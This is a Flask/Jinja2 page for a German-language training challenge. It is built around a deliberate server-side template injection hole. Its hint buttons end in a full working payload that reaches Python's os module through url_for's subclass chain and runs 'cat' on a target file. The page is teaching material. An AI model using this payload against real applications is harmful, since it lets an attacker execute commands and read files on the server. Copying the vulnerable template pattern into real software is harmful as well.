<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>

    <script>
        function give_hint(hint) {
            document.getElementById("hint_msg").innerHTML = hint;
        }
    </script>


</head>

<body>
    <div>
        {% include 'toc.html' %}
    </div>
    <form action="{{ url_for('ssti_1')}}" method="GET">
        <p>Die URL für die nächste Herausforderung ist in ~/passwordLVL2.txt gespeichert. Versuche es
            auszulesen.</br>Nutze
            das untere Eingabefeld um die Command Injection auszuführen.</br>Nutze die Hinweise, falls du nicht
            weiterkommst.</br>Nach erfolgreicher Command Injection erhälts du eine flag. Gebe diese in das untere
            Eingabefeld ein, um die challenge zu bestehen.</p>
        <hr>
        <p>Gebe eine Farbe in HEX ein und erhalte die RGB Werte.</p>
        <input type="text" name="hex" />
        <input type="submit" value="eingeben" />
    </form>

    <button
        onclick="give_hint('Die web app benutzt flask und damit die jinja2 template engine. Diese nutzt {{AUSDRUCK}} um jinja Syntax vom Rest des templates zu unterscheiden.')">Hinweis
        1</button>
    <button
        onclick="give_hint('Wir brauchen einen Einstiegspunkt für Injection. Hierfür kann beispielsweise url_for genutzt werden, das oft in flask webapps genutzt wird.')">Hinweis
        2</button>
    <button onclick="give_hint('Wir brauchen einen Weg um das os Python module zu importieren.')">Hinweis
        3</button>
    <button
        onclick="give_hint('man kann url_for.__class.__base__.__subclasses__() nutzen, um sich alle Subclasses anzeigen zu lassen. Vielleicht kann eines davon das os Modul laden.')">Hinweis
        4</button>
    <button
        onclick="give_hint('Man kann ein Submodul aus der Liste mit [INDEX] wählen. Welche Klasse könnte os importieren?')">Hinweis
        5</button>
    <button
        onclick="give_hint('Die Klasse _frozen_importlib.BuiltinImporter hat eine Methode load_module(&quot;MODULE&quot;), die das os Modul laden kann')">Hinweis
        6</button>
    <button
        onclick="give_hint('Das os Modul hat die Methode popen(&quot;cat FILE&quot;).read() mit dem man die Zieldatei lesen kann.')">Hinweis
        7</button>
    <button
        onclick="give_hint('Eine mögliche Lösung lautet:\n&#123;&#123;url_for.__class__.__base__.__subclasses__()[84].load_module(&quot;os&quot;).popen(&quot;cat ~/passwordLVL2.txt&quot;).read()&#125;&#125;')">Lösung
    </button>

    <p id="hint_msg">{{result}}</p>


</body>

</html>